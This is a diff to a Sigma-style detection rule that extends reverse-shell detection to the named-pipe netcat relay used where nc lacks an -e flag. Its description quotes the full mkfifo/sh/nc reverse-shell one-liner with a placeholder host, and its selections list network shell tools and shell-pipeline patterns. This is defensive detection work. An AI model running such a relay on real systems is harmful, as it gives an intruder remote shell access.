@@ -3,8 +3,12 @@ id: 1adaaaca-bfcf-46fe-9bd1-4b475d7bc827
 status: experimental
 description: >
   Detects netcat or socat invoked with an execute flag, the classic pattern for
-  a reverse or bind shell (nc -e / --exec, socat EXEC: / SYSTEM:). Together with
-  the existing /dev/tcp rule this closes the two dominant Linux reverse-shell
+  a reverse or bind shell (nc -e / --exec, socat EXEC: / SYSTEM:), and the
+  named-pipe relay used with netcat builds that have no -e flag (OpenBSD nc,
+  the default on Debian and Ubuntu): mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 |
+  nc host port > /tmp/f. In that form nc's own command line is innocuous, so the
+  relay is matched on the shell that runs the pipeline. Together with the
+  existing /dev/tcp rule this closes the dominant Linux reverse-shell
   primitives after initial access.
   Note: on Linux CommandLine is best-effort /proc enrichment; the execute-flag
   selections below require it, so a very short-lived nc/socat may instead be
@@ -14,6 +18,7 @@ references:
   - https://attack.mitre.org/techniques/T1071/
 author: rustinel-rules
 date: 2026-07-09
+modified: 2026-10-01
 tags:
   - attack.execution
   - attack.command-and-control
@@ -41,7 +46,30 @@ detection:
       - 'EXEC:'
       - 'system:'
       - 'SYSTEM:'
-  condition: selection_nc or selection_socat
+  selection_fifo_shell:
+    Image|endswith:
+      - '/bash'
+      - '/sh'
+      - '/dash'
+      - '/zsh'
+      - '/ksh'
+      - '/busybox'
+  selection_fifo_pipe:
+    CommandLine|contains:
+      - 'mkfifo '
+      - 'mknod '
+  selection_fifo_client:
+    CommandLine|re: '(^|[\s|;/])(nc|ncat|netcat|telnet)\s'
+  selection_fifo_interpreter:
+    # A shell inside the pipeline, not the shell running it: piped into
+    # (| /bin/sh) or started interactive after a separator (; sh -i < /tmp/f).
+    CommandLine|re:
+      - '\|\s*(\S*/)?(ba|da|z|k)?sh(\s|$)'
+      - '[;&]\s*(\S*/)?(ba|da|z|k)?sh\s+-i'
+  condition: >
+    selection_nc or selection_socat
+    or (selection_fifo_shell and selection_fifo_pipe and selection_fifo_client
+    and selection_fifo_interpreter)
 falsepositives:
   - Rare container entrypoints that use socat exec; add a parent-image filter if
     needed.
